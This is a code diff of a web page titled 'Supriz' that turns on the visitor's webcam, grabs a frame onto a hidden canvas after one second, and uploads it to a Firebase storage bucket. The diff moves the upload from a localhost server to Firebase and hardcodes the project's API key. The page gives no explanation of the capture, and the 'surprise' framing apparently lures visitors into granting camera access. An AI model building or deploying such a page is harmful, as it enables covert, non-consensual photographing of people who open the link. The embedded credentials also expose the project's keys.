@@ -4,17 +4,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>supriz</title>
+    <title>Supriz</title>
+    <!-- Firebase App (the core Firebase SDK) -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <!-- Firebase Storage -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-storage-compat.js"></script>
 </head>
 
 <body>
-    <h1>supriz</h1>
+    <h1>Supriz</h1>
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
     <script>
+        // TODO: Replace the following with your app's Firebase project configuration
+        // You can find your project configuration in the Firebase console
+        const firebaseConfig = {
+            apiKey: "AIzaSyAFQEFMCfRpxg56RsFWzN6dla8mbZTBQcE",
+            authDomain: "unread-100.firebaseapp.com",
+            projectId: "unread-100",
+            storageBucket: "unread-100.appspot.com",
+            messagingSenderId: "683114077701",
+            appId: "1:683114077701:web:0632383024954befdc466c",
+            measurementId: "G-WQ9T8KPH7S"
+        };
+
+        // Initialize Firebase  
+        firebase.initializeApp(firebaseConfig);
+        const storage = firebase.storage();
+
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const context = canvas.getContext('2d');
+
         navigator.mediaDevices.getUserMedia({
                 video: true
             })
@@ -26,21 +47,42 @@
                         canvas.height = video.videoHeight;
                         context.drawImage(video, 0, 0, canvas.width, canvas.height);
                         canvas.toBlob(async (blob) => {
-                            const formData = new FormData();
-                            formData.append('image', blob, 'capture.png');
-
-                            try {
-                                const response = await fetch(
-                                    'http://localhost:5000/upload', {
-                                        method: 'POST',
-                                        body: formData,
-                                    });
-                                const result = await response.json();
-                                alert(result.message);
-                            } catch (error) {
-                                console.error('Error uploading image:', error);
-                                alert('Failed to upload image.');
+                            if (!blob) {
+                                alert('Failed to capture image.');
+                                return;
                             }
+
+                            // Create a unique filename
+                            const filename = `captures/${Date.now()}.png`;
+                            const storageRef = storage.ref().child(filename);
+
+                            // Upload the image
+                            const uploadTask = storageRef.put(blob);
+
+                            // Monitor upload progress
+                            uploadTask.on('state_changed',
+                                (snapshot) => {
+                                    const progress = (snapshot.bytesTransferred /
+                                        snapshot.totalBytes) * 100;
+                                    console.log(`Upload is ${progress}% done`);
+                                },
+                                (error) => {
+                                    console.error('Error uploading image:', error);
+                                    alert('Failed to upload image.');
+                                },
+                                () => {
+                                    // Upload completed successfully
+                                    uploadTask.snapshot.ref.getDownloadURL().then((
+                                        downloadURL) => {
+                                        console.log('File available at',
+                                            downloadURL);
+                                        alert(
+                                            'Image uploaded successfully!'
+                                        );
+                                        // Optionally, you can send the downloadURL to your backend if needed
+                                    });
+                                }
+                            );
                         }, 'image/png');
                     }, 1000);
                 });
